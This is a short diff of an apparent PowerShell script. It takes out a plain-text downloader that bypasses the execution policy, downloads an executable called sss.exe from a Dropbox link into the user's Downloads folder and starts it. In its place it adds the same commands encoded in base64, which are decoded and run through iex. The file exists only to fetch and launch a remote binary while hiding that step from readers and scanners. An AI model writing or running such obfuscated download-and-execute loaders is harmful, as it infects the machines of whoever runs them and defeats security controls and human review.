@@ -1,3 +1,2 @@
-Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass;
-Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/2idkbo5sf67k6j2t6vlu2/sss.exe?rlkey=cjwmhileubxma3p41x1buhwxv&st=dcf7g4k4&dl=1" -OutFile "$env:USERPROFILE\Downloads\sss.exe";
-Start-Process -FilePath "$env:USERPROFILE\Downloads\sss.exe";
+$a = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U2V0LUV4ZWN1dGlvblBvbGljeSAtU2NvcGUgUHJvY2VzcyAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzczsKSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAiaHR0cHM6Ly93d3cuZHJvcGJveC5jb20vc2NsL2ZpLzJpZGtibzVzZjY3azZqMnQ2dmx1Mi9zc3MuZXhlP3Jsa2V5PWNqd21oaWxldWJ4bWEzcDQxeDFidWh3eHYmc3Q9ZGNmN2c0azQmZGw9MSIgLU91dEZpbGUgIiRlbnY6VVNFUlBST0ZJTEVcRG93bmxvYWRzXHNzcy5leGUiOwpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAiJGVudjpVU0VSUFJPRklMRVxEb3dubG9hZHNcc3NzLmV4ZSI7Cg=='))
+iex $a
